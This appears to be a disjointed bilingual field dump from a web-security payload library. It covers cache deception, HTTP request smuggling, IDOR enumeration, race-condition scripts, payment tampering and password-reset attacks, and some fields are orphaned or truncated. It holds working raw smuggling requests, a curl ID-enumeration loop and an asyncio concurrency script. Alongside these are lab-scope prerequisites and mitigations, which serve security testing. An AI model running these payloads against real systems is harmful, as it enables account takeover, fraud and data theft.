https://{TARGET}/account/settings/.css
https://{TARGET}/account/settings/test.avif
https://{TARGET}/account/settings/x.woff2
https://{TARGET}//account//settings.css
https://{TARGET}/account/settings%252f.css

description.zh: 绕过 CDN 按单后缀判定静态的规则：双扩展叠加改变后缀解析。成功判据：私有响应被缓存返回。
description.en: Bypasses CDN static-file rules keyed on a single suffix by stacking extensions to shift suffix parsing. Success: the private response is cached and served.

description.zh: 编码的点号与扩展名绕过字面后缀匹配。成功判据：缓存层仍按静态处理。

description.zh: 查询串/分号/片段后缀改变键形态但保持静态判定。成功判据：私有内容进入缓存。

description.zh: 以认证会话请求静态后缀路径，再匿名重复请求；匿名请求取回私有内容，即确认缓存欺骗。
description.en: Request the static-suffixed paths with an authenticated session, then repeat anonymously; anonymous retrieval of private content confirms web cache deception.

name.zh: CL.TE 请求走私

description.zh: 覆盖 CL.TE 请求走私基础形态：前端信任 Content-Length、后端信任 Transfer-Encoding 时注入第二请求边界，验证队列错位与请求偷渡。
description.en: Covers core CL.TE request smuggling: inject a second request boundary when the front-end trusts Content-Length and the back-end trusts Transfer-Encoding, verifying queue desync.

subCategory.zh: CL.TE 与 TE.CL 经典分歧

prerequisites.zh: 确认 HTTP CL-TE 消息边界回归 的目标、账号、数据、组件版本和停止条件均属于可回滚的授权实验范围。
prerequisites.en: Confirm that the target, accounts, data, component version, and stop conditions for HTTP CL-TE Message-Boundary Regression are inside a reversible authorized lab scope.

prerequisites.zh: 准备正常输入、唯一标记、服务端日志和阴性对照；禁止扩展到非实验资产、真实凭据或不可回滚状态。
prerequisites.en: Prepare normal input, a unique marker, server logs, and a negative control; do not expand to non-lab assets, real credentials, or irreversible state.

overview.zh: 该 Payload 覆盖 HTTP 请求走私的消息边界分歧场景，检验代理链对 Content-Length 与 Transfer-Encoding 的分帧取舍是否一致。验证维度含 CL-TE、TE-CL 基础形态与重复 TE 头的 TE-TE 混淆，对应第 1 至第 3 步。
overview.en: This payload covers HTTP request-smuggling message-boundary divergence, testing whether the proxy chain frames messages consistently between Content-Length and Transfer-Encoding. Validation covers basic CL-TE and TE-CL forms plus duplicate-TE TE.TE confusion, mapped to steps 1 through 3.

vulnerability.zh: 根因在于前后端对同一报文选择不同的消息定界标准：一端按 Content-Length、另一端按 chunked 结束，多余字节被并入后续请求，攻击者借此把任意请求走私进内网。
vulnerability.en: The root cause is front and back ends choosing different framing standards for the same message: one delimits by Content-Length while the other honors chunked framing, so leftover bytes merge into the next request and attackers can smuggle arbitrary requests into the internal network.

exploitation.zh: 第 1 步发送 CL 与 TE 并存的原始请求，SMUGGLED 被解析为下一条请求或出现超时差异即确认 CL-TE；第 2 步交换定界方向构造 TE-CL 请求，剩余分帧进入第二条请求即确认；第 3 步发送重复 TE 头，两端仲裁不一致即确认 TE-TE。用原始套接字发送避免客户端改写。占位符在全局变量菜单替换；变体参考 wafBypass。
exploitation.en: In step 1, send the raw CL-plus-TE message; SMUGGLED parsed as the next request or a timeout difference confirms CL-TE. In step 2, flip framing to TE-CL; leftover chunks entering the second request confirm it. In step 3, send duplicate TE headers; inconsistent arbitration confirms TE-TE. Send via raw sockets to avoid client rewriting. Replace placeholders via the global variables menu; see wafBypass for variants.

mitigation.zh: 网关禁止 CL 与 TE 并存及重复 TE 头，统一链路分帧标准并拒绝歧义报文，前后端保持同版本解析实现。修复后重放第 1 至第 3 步，歧义请求应被 400 拒绝且两跳请求计数一致。
mitigation.en: Gateways must reject CL-plus-TE coexistence and duplicate TE headers, unify framing standards across the chain, refuse ambiguous messages, and keep parser implementations aligned. After the fix, replay steps 1 through 3: ambiguous requests should get 400 and hop request counts must agree.

title.zh: 探测 CL-TE 分帧差异

description.zh: 发送 CL 与 TE 并存的请求，前端按 Content-Length 截断而后端按 chunked 提前结束；出现超时差异或 SMUGGLED 标记出现在下一个响应里，即确认走私条件成立。
description.en: Send a request carrying both Content-Length and Transfer-Encoding; if the frontend truncates by CL while the backend ends early by chunked framing, timeouts or a SMUGGLED marker in the next response confirm the smuggling condition.

attackChain.payload:
POST / HTTP/1.1
Host: {TARGET}
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED

title.zh: 验证 TE-CL 反向走私

description.zh: 交换分帧优先级发送 TE-CL 请求，后端按 Content-Length 只取正文前三字节，剩余数据进入下一请求解析；走私标记被独立处理即与第 1 步互补，确认双向可利用。
description.en: Flip the framing priority with a TE-CL request where the backend keeps only the first bytes by Content-Length; the leftover framing becomes the next request, confirming the reverse direction is exploitable.

attackChain.payload:
POST / HTTP/1.1

name.zh: CL.CL 请求走私

description.zh: 验证前后端对重复 Content-Length 请求的处理是否一致，防止 CL.CL 解析分歧被用于请求走私。
description.en: Verifies that the front end and back end consistently reject requests with duplicate Content-Length headers, preventing CL.CL parsing divergence from being used for request smuggling.

prerequisites.zh: 确认 HTTP 重复 Content-Length 拒绝回归 的目标、账号、数据、组件版本和停止条件均属于可回滚的授权实验范围。
prerequisites.en: Confirm that the target, accounts, data, component version, and stop conditions for HTTP Duplicate Content-Length Rejection Regression are inside a reversible authorized lab scope.

prerequisites.zh: 准备正常输入、唯一标记、服务端日志和阴性对照；禁止扩展到非实验资产、真实凭据或不可回滚状态。
prerequisites.en: Prepare normal input, a unique marker, server logs, and a negative control; do not expand to non-lab assets, real credentials, or irreversible state.

overview.zh: 该 Payload 覆盖重复 Content-Length 的拒绝与回归场景，检验代理链是否按 RFC 一致拒绝歧义报文，防止 CL.CL 分歧演化为走私。验证维度含重复 CL 原始请求、双消息边界与持久连接样例，对应第 1 至第 3 步。
overview.en: This payload covers duplicate Content-Length rejection regression, testing whether the proxy chain uniformly rejects ambiguous messages per RFC so CL.CL divergence cannot evolve into smuggling. Validation covers a raw duplicate-CL request, a dual-message boundary, and a keep-alive sample, mapped to steps 1 through 3.

vulnerability.zh: 根因在于前后端对重复 Content-Length 的仲裁规则不一致：一端取首值另一端取末值或直接放行，消息边界随之错位，剩余字节被解析为独立请求。
vulnerability.en: The root cause is inconsistent arbitration of duplicate Content-Length values between front and back ends: one takes the first value, another the last or accepts outright, shifting message boundaries so leftover bytes parse as an independent request.

exploitation.zh: 第 1 步用 printf 构造携带两个不同 CL 值的原始 POST 并以套接字发送到授权 echo 路径，前后端都应返回 400；第 2 步发送双消息边界样例，按两跳日志的请求计数判断第二请求是否出现；第 3 步在 keep-alive 连接上重复验证持久连接行为。任一后端执行第二条请求即确认拒绝缺失。占位符在全局变量菜单替换。
exploitation.en: In step 1, build a raw POST with two different CL values via printf and socket it to the authorized echo path; both ends should return 400. In step 2, send the dual-message boundary sample and judge second-request appearance from hop-log request counts. In step 3, repeat on a keep-alive connection for persistence behavior. Any backend executing the second request confirms missing rejection. Replace placeholders via the global variables menu.

mitigation.zh: 所有层级对重复或冲突的 Content-Length 一律返回 400 并断开连接，网关在入口完成规范化校验。修复后重放第 1 至第 3 步，歧义报文应被全部拒绝且两跳计数一致。
mitigation.en: Every layer must return 400 and close on duplicate or conflicting Content-Length, with the gateway normalizing at ingress. After the fix, replay steps 1 through 3: ambiguous messages should all be rejected and hop counts agree.

title.zh: 发送重复 Content-Length 探测

description.zh: 用原始 TCP 向 echo 路径发送两个不同 Content-Length 的 POST；RFC 要求直接拒绝该类报文，若出现正常响应或单值被采纳即锁定前后端对 CL 仲裁的分歧。
description.en: Send a raw TCP POST carrying two different Content-Length values to the echo path; RFC mandates rejection, so any normal response or silent adoption of one value exposes the parsers' disagreement.

description.zh: 把第二个完整请求写进正文并声明冲突的 CL 值，使两端对正文归属判断不一致；两跳请求计数出现分歧或第二请求被独立处理即走私成功。
description.en: Place a second full request in the body with conflicting CL values so the two hops disagree on body ownership; diverging request counts or independent handling of the second request confirm smuggling.

title.zh: 持久连接验证稳定利用

description.zh: 在 keep-alive 连接上重发第 2 步的双请求结构，走私请求在连接复用时仍被后端独立解析；代理与后端日志请求数不一致即确认可稳定利用。
description.en: Replay the step-2 dual-request structure over a keep-alive connection; if the smuggled request is still parsed independently and proxy/backend log counts diverge, the primitive is stably exploitable.

description.zh: 经 HTTP/2 降级以 content-length:0 携带正文发送；h2 分帧与 HTTP/1.1 的 CL 仲裁不一致使走私消息到达后端，即绕过前端对重复 CL 头的严格拦截。
description.en: Downgrade through HTTP/2 sending a body alongside content-length:0; the mismatch between h2 framing and HTTP/1.1 CL arbitration lets the smuggled message reach the backend past strict CL filtering.

analysis.en: HTTP Duplicate Content-Length Rejection Regression is confirmed only when the unique input, final parsing or authorization result, server-side logs, and observable impact agree. A status code, timeout, error string, client display, or tool guess is only a lead; retain a negative control and exact version prerequisites.

opsecTips.en: Run one unique marker at a time and limit request count, retained response data, and experiment duration.

opsecTips.zh: 出现真实凭据、非实验数据、不可逆写入或非授权连接时立即停止并清理夹具。
opsecTips.en: Stop immediately and clean up the fixture on real credentials, non-lab data, irreversible writes, or unauthorized connections.

review.rationale: 依据 RFC 9112 验证不同 Content-Length 值是否被整条代理链拒绝，不尝试访问管理路径。 保留原有合法攻击样例与变体，仅替换已证实的失效占位、协议错误或事实混淆，并补齐授权实验边界、检测证据、双语教程和权威引用。

name.zh: TE.CL 请求走私

description.zh: 覆盖 TE-CL 走私形态验证：从前端分帧计时探测，到后端按 Content-Length 截断的走私请求与大 CL 吞噬请求头样例，并附 TE 头空白与 chunk 长度行变体清单，用于确认前后端分帧不一致的利用深度。
description.en: Covers TE-CL smuggling form validation: from front-end framing timing probes through back-end Content-Length truncation smuggled requests and large-CL header-swallowing samples, with TE-header whitespace and chunk-length line variant lists, confirming exploitation depth of front/back framing inconsistency.

subCategory.zh: CL.TE 与 TE.CL 经典分歧

prerequisites.zh: 确认 HTTP TE-CL 消息边界回归 的目标、账号、数据、组件版本和停止条件均属于可回滚的授权实验范围。
prerequisites.en: Confirm that the target, accounts, data, component version, and stop conditions for HTTP TE-CL Message-Boundary Regression are inside a reversible authorized lab scope.

prerequisites.zh: 准备正常输入、唯一标记、服务端日志和阴性对照；禁止扩展到非实验资产、真实凭据或不可回滚状态。
prerequisites.en: Prepare normal input, a unique marker, server logs, and a negative control; do not expand to non-lab assets, real credentials, or irreversible state.

overview.zh: 该 Payload 覆盖 TE-CL 消息边界分歧场景，检验前端按 chunked 转发而后端按 Content-Length 截断时的走私条件与利用深度。验证维度含计时探测、截断走私与大 CL 吞噬请求头三步，对应第 1 至第 3 步。
overview.en: This payload covers TE-CL message-boundary divergence, testing smuggling conditions and exploit depth when the front end forwards chunked while the back end truncates by Content-Length. Validation covers timing probing, truncation smuggling, and large-CL header capture, mapped to steps 1 through 3.

vulnerability.zh: 根因在于前后端对同一请求选择不同的定界头：前端信任 Transfer-Encoding、后端信任 Content-Length，多余分帧数据被并入下一条请求，攻击者可借此劫持他人请求头。
vulnerability.en: The root cause is front and back ends picking different delimiting headers for one request: the front end trusts Transfer-Encoding while the back end trusts Content-Length, so leftover framed data merges into the next request and attackers can capture other users' headers.

exploitation.zh: 第 1 步先用 curl 发送同时带 TE 与 CL 的 chunked 请求，再用原始套接字发送仅以终止块结尾的请求并测量响应时间，超时特征即指示分帧分歧；第 2 步构造后端按 CL 截断的报文使剩余字节成为独立请求；第 3 步声明超大 CL 把下一位用户的请求头并入参数验证劫持。占位符在全局变量菜单替换；变体参考 wafBypass。
exploitation.en: In step 1, first send a chunked request with both TE and CL via curl, then a raw-socket request ending only with the terminator chunk, timing responses; timeout signatures indicate framing divergence. In step 2, craft the backend truncating by CL so leftover bytes become an independent request. In step 3, declare an oversized CL folding the next user's headers into a parameter to prove hijack. Replace placeholders via the global variables menu; see wafBypass for variants.

name.zh: 对象级授权跨账号验证

description.zh: 覆盖对象级授权（IDOR）的跨账号验证：从跨账号对象访问基线请求，到顺序 ID 枚举探测授权边界，再到管理接口角色篡改与重复/数组参数越权样例，并附 ID 编码边界值变体，用于确认越权访问是否成立。
description.en: Covers cross-account validation of broken object-level authorization (IDOR): from cross-account baseline requests through sequential ID enumeration probing the authorization boundary to admin-interface role tampering and duplicate/array parameter privilege samples, with ID-encoding boundary variants, confirming whether unauthorized access holds.

prerequisites.zh: 确认 对象级授权跨账号验证 的目标、账号、数据、组件版本和停止条件均属于可回滚的授权实验范围。
prerequisites.en: Confirm that the target, accounts, data, component version, and stop conditions for Cross-Account Object-Level Authorization Validation are inside a reversible authorized lab scope.

prerequisites.zh: 准备正常输入、唯一标记、服务端日志和阴性对照；禁止扩展到非实验资产、真实凭据或不可回滚状态。
prerequisites.en: Prepare normal input, a unique marker, server logs, and a negative control; do not expand to non-lab assets, real credentials, or irreversible state.

overview.zh: 该 Payload 覆盖对象级授权的跨账号验证场景，检验资源接口是否把对象访问绑定到当前主体。验证维度含跨账号基线、顺序 ID 枚举、管理接口与角色字段篡改、重复参数取值四步，对应第 1 至第 4 步。
overview.en: This payload covers object-level authorization via cross-account validation, testing whether resource APIs bind object access to the current principal. Validation covers a cross-account baseline, sequential ID enumeration, admin endpoints with role tampering, and duplicate-parameter resolution, mapped to steps 1 through 4.

vulnerability.zh: 根因在于控制器按 ID 直接取数而缺少归属校验，权限字段又接受客户端写入：对象编号可枚举、角色可篡改、参数取值顺序可控，越权链路完整成立。
vulnerability.en: The root cause is controllers fetching by ID without ownership checks while accepting client-written privilege fields: object IDs are enumerable, roles tamperable, and parameter resolution order controllable, completing the escalation chain.

exploitation.zh: 第 1 步以当前令牌请求用户 1001 的资料建立基线响应；第 2 步循环遍历相邻 ID 并记录状态码与响应大小，识别可越权区间；第 3 步用普通令牌访问管理列表接口，再向目标用户提交携带角色提升字段的 PUT；第 4 步以重复参数、重复 JSON 键与数组语法检测服务端取值顺序。任一步返回他人对象或接受提权即确认 IDOR。占位符在全局变量菜单替换；ID 边界值参考 wafBypass 清单。
exploitation.en: In step 1, request user 1001's profile with the current token to baseline the response. In step 2, loop adjacent IDs recording status codes and sizes to identify the accessible range. In step 3, hit the admin list endpoint with an ordinary token, then PUT the target user with privilege-elevating fields. In step 4, probe server-side resolution order with duplicate parameters, duplicate JSON keys and array syntax. Any step returning another user's object or accepting elevation confirms IDOR. Replace placeholders via the global variables menu; see wafBypass for ID boundary values.

mitigation.zh: 每个对象访问点执行主体归属三元校验，权限字段仅服务端维护；错误响应统一化避免枚举信号。修复后重放第 1 至第 4 步，越权请求应全部返回 404 并记录审计。
mitigation.en: Enforce principal-ownership checks at every object access point, keep privilege fields server-managed, and unify error responses to remove enumeration signals. After the fix, replay steps 1 through 4: all cross-account requests should return 404 with audit logs.

title.zh: 建立自身对象的正常访问
title.en: Establish normal access to own object

description.zh: 以当前令牌请求用户 1001 的资料接口并记录响应结构与字段；接口正常返回即明确对象访问的请求形态，为后续越权比对提供参照。
description.en: Request user 1001's profile with the current token and record the response shape; a normal return defines the request form used as the reference for later cross-account attempts.

title.zh: 枚举相邻对象 ID 边界

description.zh: 循环遍历 1000 至 1010 的用户 ID 并记录每个请求的状态码与响应大小；出现 200 且内容为他人资料即圈定可越权访问的对象区间。
description.en: Loop over user IDs 1000-1010 recording status codes and response sizes; a 200 returning another person's profile delineates the horizontally accessible object range.

attackChain.payload:
for id in $(seq 1000 1010); do
curl -s -o /dev/null -w "%{http_code} %{size_download}" \
-H "Authorization: Bearer {TOKEN}" \
"https://{TARGET}/api/users/$id/profile"
echo " -> user_id=$id"
done

title.zh: 尝试管理接口与权限篡改
title.en: Try admin endpoints and privilege tampering

description.zh: 以普通令牌访问 /api/admin/users 并向用户 1001 提交 role=admin 的 PUT 请求；列表返回或权限字段更新成功即确认横向越权叠加垂直提升。
description.en: Hit /api/admin/users with the plain token and PUT role=admin on user 1001; a returned list or accepted privilege field confirms horizontal access plus vertical escalation.

description.zh: 以重复 user_id 参数、JSON 重复键与数组语法提交请求，利用服务端取值顺序替换目标对象；操作作用于他人对象即确认参数污染型越权可用。
description.en: Submit duplicated user_id parameters, repeated JSON keys and array syntax to exploit server-side value ordering; the action landing on another user's object confirms pollution-based IDOR.

title.zh: 编码变体绕过 ID 过滤
title.en: Bypass ID filters with encoded variants

description.zh: 把目标 ID 换成 base64、十六进制、-1 与整型上限等变体再次提交越权请求；任一变体返回他人数据即绕过基于明文 ID 的访问控制。
description.en: Retry the access request with base64, hexadecimal, -1 and INT_MAX ID variants; any variant returning another user's data bypasses plaintext-ID access control.

analysis.zh: 对象级授权跨账号验证只有在唯一输入、最终解析或授权结果、服务端日志和可观察影响相互一致时才能确认。单一状态码、超时、错误文本、客户端显示或工具猜测只应作为线索，必须保留阴性对照和版本条件。
analysis.en: Cross-Account Object-Level Authorization Validation is confirmed only when the unique input, final parsing or authorization result, server-side logs, and observable impact agree. A status code, timeout, error string, client display, or tool guess is only a lead; retain a negative control and exact version prerequisites.

opsecTips.zh: 一次只运行一个唯一标记，并限制请求次数、响应保存范围和实验持续时间。
opsecTips.en: Run one unique marker at a time and limit request count, retained response data, and experiment duration.

opsecTips.zh: 出现真实凭据、非实验数据、不可逆写入或非授权连接时立即停止并清理夹具。
opsecTips.en: Stop immediately and clean up the fixture on real credentials, non-lab data, irreversible writes, or unauthorized connections.

review.rationale: 仅使用两个专用实验账号和一个固定对象，验证主体、对象与动作是否在服务端重新绑定。 保留原有合法攻击样例与变体，仅替换已证实的失效占位、协议错误或事实混淆，并补齐授权实验边界、检测证据、双语教程和权威引用。

description.en: Iterates user IDs 1000 through 1010, recording each status code and response size to identify object ranges accessible without authorization.

description.en: First accesses the admin user-list endpoint with a normal token, then sends a PUT for user 1001 carrying role=admin and is_admin=true to test horizontal escalation and permission-field tampering.

title.zh: 顺序 ID 替换遍历
title.en: Validation step 1 for Sequential Object ID Enumeration

description.zh: 把相邻对象 ID 逐条替换进受保护请求；其他用户对象被返回，即确认顺序 ID 的对象级授权缺失。
description.en: Substitute each adjacent object ID into the protected request; other users objects being returned confirms missing object-level authorization on sequential IDs.

name.zh: 业务状态并发原子性验证

description.zh: 覆盖业务竞态条件的并发验证：从竞态目标识别，到 Python 并发脚本与 Burp Turbo Intruder 高并发打击，再到领取前后资源状态对照，并附 HTTP/2 并发请求变体，用于确认业务操作是否缺乏原子性保护。
description.en: Covers concurrent validation of business race conditions: from race-target identification through Python concurrency scripts and Burp Turbo Intruder high-rate firing to pre/post-claim resource state comparisons, with HTTP/2 concurrent request variants, confirming whether business operations lack atomicity protection.

prerequisites.zh: 确认 业务状态并发原子性验证 的目标、账号、数据、组件版本和停止条件均属于可回滚的授权实验范围。
prerequisites.en: Confirm that the target, accounts, data, component version, and stop conditions for Business-State Concurrency Atomicity Validation are inside a reversible authorized lab scope.

prerequisites.zh: 准备正常输入、唯一标记、服务端日志和阴性对照；禁止扩展到非实验资产、真实凭据或不可回滚状态。
prerequisites.en: Prepare normal input, a unique marker, server logs, and a negative control; do not expand to non-lab assets, real credentials, or irreversible state.

overview.zh: 该 Payload 覆盖业务竞态条件的并发原子性场景，检验领取、兑换等状态递减端点是否在并发下被多次成功。验证维度含竞态目标识别、Python 并发脚本、Turbo Intruder 打击与前后状态对照四步，对应第 1 至第 4 步。
overview.en: This payload covers business race conditions and concurrent atomicity, testing whether state-decreasing endpoints such as claims and redemptions succeed multiple times under concurrency. Validation covers target identification, a Python concurrency script, a Turbo Intruder strike, and before/after state comparison, mapped to steps 1 through 4.

vulnerability.zh: 根因在于库存或权益扣减缺少原子事务与唯一性约束：检查与扣减之间存在时间窗口，并发请求同时通过校验并各自成功，库存被超发或权益被重复发放。
vulnerability.en: The root cause is inventory or entitlement deduction lacking atomic transactions and uniqueness constraints: a window exists between check and decrement, so concurrent requests pass validation simultaneously and each succeeds, oversubscribing stock or double-granting entitlements.

exploitation.zh: 第 1 步锁定状态递减端点并取得响应与资源数量基线；第 2 步用 asyncio 并发发送 50 个相同领取请求并统计成功数；第 3 步以 Turbo Intruder gate 同步释放观察多请求同时命中；第 4 步对照领取前后优惠券列表与余额确认多次扣减。成功数大于一即确认原子性缺失。占位符在全局变量菜单替换；HTTP/2 变体参考 wafBypass。
exploitation.en: In step 1, lock the state-decreasing endpoint and capture the response plus a count baseline. In step 2, fire 50 identical claim requests concurrently with asyncio and count successes. In step 3, release a synchronized Turbo Intruder gate watching simultaneous hits. In step 4, compare coupon lists and balances before and after to confirm repeated deduction. More than one success confirms missing atomicity. Replace placeholders via the global variables menu; see wafBypass for the HTTP/2 variant.

mitigation.zh: 扣减操作放入数据库原子事务或使用乐观锁与唯一索引约束，幂等键防重复提交。修复后重放第 2、3 步，成功响应应恒为一次且库存一致。
mitigation.en: Wrap deductions in atomic database transactions or optimistic locking with unique indexes, and add idempotency keys against duplicates. After the fix, replay steps 2 and 3: successes must always be exactly one with consistent stock.

description.zh: 从优惠券领取、提现、兑换、抢购、投票等典型场景中锁定一个状态递减端点，并用正常请求走通业务流程；确定资源唯一标识与成功响应特征。
description.en: Pick one state-decrementing endpoint among coupon claims, withdrawals, exchanges or votes and walk the flow normally; settle the resource identifier and the success response signature.

title.zh: 记录攻击前的资源状态

description.zh: 发起并发前请求优惠券列表与余额接口，留存当前剩余数量与账户状态；这些数值是与攻击后结果比对、量化多领收益的参照。
description.en: Query the coupon list and balance endpoints before firing to capture the current remaining count and account state; these numbers anchor the post-attack profit comparison.

title.en: Flood the endpoint with async concurrency

description.zh: 用 Python asyncio 同时提交 50 个相同领取请求；出现多个 success 响应或资源扣减次数超过剩余量即确认并发原子性缺失。
description.en: Fire 50 identical claim requests concurrently with Python asyncio; multiple success responses or decrements beyond the remaining stock confirm missing atomicity.

title.zh: 同步释放提高命中精度
title.en: Raise hit rate with synchronized release

description.zh: 用 Burp Turbo Intruder 的 gate 机制同步释放请求，使全部请求同毫秒到达后端；与第 3 步相比命中率更高，多次扣减即坐实竞态可稳定利用。
description.en: Use Turbo Intruder's gate to release every request in the same instant; higher hit rates than step 3 with repeated decrements prove the race is reliably exploitable.

title.zh: HTTP/2 多路复用绕过限流
title.en: Bypass rate limits with HTTP/2 multiplexing

description.zh: 用 curl 的 http2 与 parallel 参数在单连接内并发 50 个领取请求；同一 TCP 连接的多路复用绕过基于连接数的限流，再借第 2 步的请求核对多领数量。
description.en: Multiplex 50 claim requests on one connection with curl --http2 --parallel; single-connection multiplexing slips past per-connection limits, then re-run the step-2 query to count the profit.

attackChain.payload: urls=""; for i in $(seq 1 50); do urls="$urls https://{TARGET}/api/coupon/claim"; done

analysis.zh: 业务状态并发原子性验证只有在唯一输入、最终解析或授权结果、服务端日志和可观察影响相互一致时才能确认。单一状态码、超时、错误文本、客户端显示或工具猜测只应作为线索，必须保留阴性对照和版本条件。
analysis.en: Business-State Concurrency Atomicity Validation is confirmed only when the unique input, final parsing or authorization result, server-side logs, and observable impact agree. A status code, timeout, error string, client display, or tool guess is only a lead; retain a negative control and exact version prerequisites.

opsecTips.zh: 一次只运行一个唯一标记，并限制请求次数、响应保存范围和实验持续时间。
opsecTips.en: Run one unique marker at a time and limit request count, retained response data, and experiment duration.

opsecTips.zh: 出现真实凭据、非实验数据、不可逆写入或非授权连接时立即停止并清理夹具。
opsecTips.en: Stop immediately and clean up the fixture on real credentials, non-lab data, irreversible writes, or unauthorized connections.

review.rationale: 最多并发两个可回滚实验请求，验证限额、余额或状态转换是否由原子事务保护。 保留原有合法攻击样例与变体，仅替换已证实的失效占位、协议错误或事实混淆，并补齐授权实验边界、检测证据、双语教程和权威引用。

execution.command:
# 典型竞态场景：
# 1. 优惠券领取 POST /api/coupon/claim
# 2. 余额提现 POST /api/withdraw
# 3. 积分兑换 POST /api/points/exchange
# 4. 限量商品抢购 POST /api/order/create

execution.command:
import asyncio
import aiohttp

async def race_request(session, url, headers, data):
    async with session.post(url, headers=headers, json=data) as resp:
        return await resp.json()

async def main():
    url = "https://{TARGET}/api/coupon/claim"
    headers = {"Authorization": "Bearer {TOKEN}"}
    data = {"coupon_id": "COUPON001"}
    async with aiohttp.ClientSession() as session:
        tasks = [race_request(session, url, headers, data) for _ in range(50)]
        results = await asyncio.gather(*tasks)
        success = sum(1 for r in results if r.get("code") == 200)
        print(f"Total: {len(results)}, Success: {success}")

asyncio.run(main())

name.zh: 支付金额服务端重算验证

description.zh: 覆盖支付金额篡改的服务端校验验证：从下单价格字段与数量/费用字段篡改，到优惠券字段篡改，再到支付回调参数伪造，并附价格类型混淆变体清单，用于确认金额是否仅由客户端参数决定。
description.en: Covers server-side validation of payment amount tampering: from order price and quantity/fee field tampering through coupon field tampering to payment-callback parameter forgery, with price type-confusion variant lists, confirming whether amounts are decided solely by client parameters.

prerequisites.zh: 确认 支付金额服务端重算验证 的目标、账号、数据、组件版本和停止条件均属于可回滚的授权实验范围。
prerequisites.en: Confirm that the target, accounts, data, component version, and stop conditions for Server-Side Payment Amount Recalculation Validation are inside a reversible authorized lab scope.

prerequisites.zh: 准备正常输入、唯一标记、服务端日志和阴性对照；禁止扩展到非实验资产、真实凭据或不可回滚状态。
prerequisites.en: Prepare normal input, a unique marker, server logs, and a negative control; do not expand to non-lab assets, real credentials, or irreversible state.

overview.zh: 该 Payload 覆盖支付金额服务端重算场景，检验订单金额、数量费用、优惠与回调签名是否仅由客户端参数决定。验证维度含价格字段、数量与费用字段、优惠券字段与回调伪造四步，对应第 1 至第 4 步。
overview.en: This payload covers server-side payment recalculation, testing whether order amounts, quantity fees, discounts and callback signatures are decided solely by client parameters. Validation covers price fields, quantity and fee fields, coupon fields, and callback forgery, mapped to steps 1 through 4.

vulnerability.zh: 根因在于服务端直接信任请求中的金额与优惠字段而不按商品与规则重算：价格可置零或为负、内部券号可猜测、回调签名无验证，资损链路自下单延伸到支付回调。
vulnerability.en: The root cause is the server trusting client-sent amounts and discount fields instead of recalculating from product data and rules: prices can be zeroed or negative, internal coupon IDs guessable, callback signatures unverified, extending the loss chain from ordering to payment callbacks.

exploitation.zh: 第 1 步向下单接口提交 price 分别为正常值、1、0、负数的四个请求体并比较成交金额；第 2 步以零与负数量、负运费与超额折扣字段复测边界；第 3 步提交多券列表、伪造内部券号与直接覆盖折扣字段的请求体；第 4 步向回调端点发送篡改金额与伪造签名的表单并核对入账结果。任一环节金额按请求值生效即确认校验缺失。占位符在全局变量菜单替换；类型混淆变体参考 wafBypass。
exploitation.en: In step 1, submit four order bodies with price set to normal, 1, 0 and negative values, comparing the charged amounts. In step 2, retest boundaries with zero and negative quantities, negative shipping fees and over-quota discounts. In step 3, submit multi-coupon lists, forged internal coupon IDs and direct discount-field overrides. In step 4, post tampered amounts and forged signatures to the callback endpoint and check the booked result. Any stage honoring the requested amount confirms missing validation. Replace placeholders via the global variables menu; see wafBypass for type-confusion variants.

mitigation.zh: 金额一律由服务端按商品与优惠规则重算，回调强制验签并核对金额一致；数值字段校验非负与上限。修复后重放第 1 至第 4 步，全部篡改请求应被拒绝且金额不变。
mitigation.en: Always recalculate amounts server-side from product and discount rules, enforce callback signature verification with amount consistency, and validate numeric fields for non-negativity and caps. After the fix, replay steps 1 through 4: every tampered request should be rejected with amounts unchanged.

A status code, timeout, error string, client display, or tool guess is only a lead; retain a negative control and exact version prerequisites.

name.zh: 密码重置令牌绑定验证

description.zh: 覆盖密码重置流程的令牌绑定验证：从 Host 头注入劫持重置链接，到四位验证码全遍历与响应操纵绕过，再到时间戳令牌离线预测，并附 Host 头混淆变体清单，用于确认重置令牌与账号的绑定强度。
description.en: Covers token-binding validation of password reset flows: from Host-header injection hijacking reset links through four-digit code enumeration and response-manipulation bypass to offline timestamp token prediction, with Host-header confusion variant lists, confirming how strongly reset tokens bind to accounts.

prerequisites.zh: 确认 密码重置令牌绑定验证 的目标、账号、数据、组件版本和停止条件均属于可回滚的授权实验范围。
prerequisites.en: Confirm that the target, accounts, data, component version, and stop conditions for Password-Reset Token Binding Validation are inside a reversible authorized lab scope.

prerequisites.zh: 准备正常输入、唯一标记、服务端日志和阴性对照；禁止扩展到非实验资产、真实凭据或不可回滚状态。
prerequisites.en: Prepare normal input, a unique marker, server logs, and a negative control; do not expand to non-lab assets, real credentials, or irreversible state.

overview.zh: 该 Payload 覆盖密码重置流程的令牌绑定强度场景，检验链接派生、验证码、响应处理与令牌生成的四个薄弱环节。验证维度含 Host 注入、验证码遍历、响应操纵与时间戳令牌预测四步，对应第 1 至第 4 步。
overview.en: This payload covers token-binding strength across the password-reset flow, testing four weak links: link derivation, verification codes, response handling and token generation. Validation covers Host injection, code enumeration, response manipulation and timestamp-token prediction, mapped to steps 1 through 4.

vulnerability.zh: 根因在于流程各环节缺少服务端强约束：重置链接主机取自请求头、验证码无尝试上限、前端仅看响应状态放行、令牌由可预测的时间戳派生，任一环节失守即可接管账号。
vulnerability.en: The root cause is missing server-side constraints at each stage: reset-link hosts come from request headers, codes lack attempt caps, the frontend gates only on response status, and tokens derive from predictable timestamps, so any single weak link enables account takeover.

exploitation.zh: 第 1 步向重置接口注入恶意 Host 或 X-Forwarded-Host，观察生成链接是否指向注入域；第 2 步遍历 0000-9999 验证码，命中即输出并停止；第 3 步拦截失败响应改写为成功结构，检验前端是否直接放行；第 4 步按时间戳下划线用户名结构离线预测令牌。任一环节成功即确认对应缺陷。占位符在全局变量菜单替换；Host 变体参考 wafBypass。
exploitation.en: In step 1, inject a malicious Host or X-Forwarded-Host into the reset API and check whether links point at the injected domain. In step 2, enumerate codes 0000-9999, printing and stopping on a hit. In step 3, intercept the failure response rewritten as success to see whether the frontend proceeds. In step 4, predict tokens offline per the timestamp-underscore-username structure. Success at any stage confirms the defect. Replace placeholders via the global variables menu; see wafBypass for Host variants.

mitigation.zh: 链接域名服务端固定，验证码限制尝试次数并绑定账号，流程放行只认服务端状态，令牌由 CSPRNG 生成。修复后重放第 1 至第 4 步，四个环节均应失败关闭。
mitigation.en: Pin link domains server-side, cap code attempts bound to the account, gate flow progress only on server state, and generate tokens with a CSPRNG. After the fix, replay steps 1 through 4: every stage must fail closed.

title.zh: 劫持重置邮件的链接域名

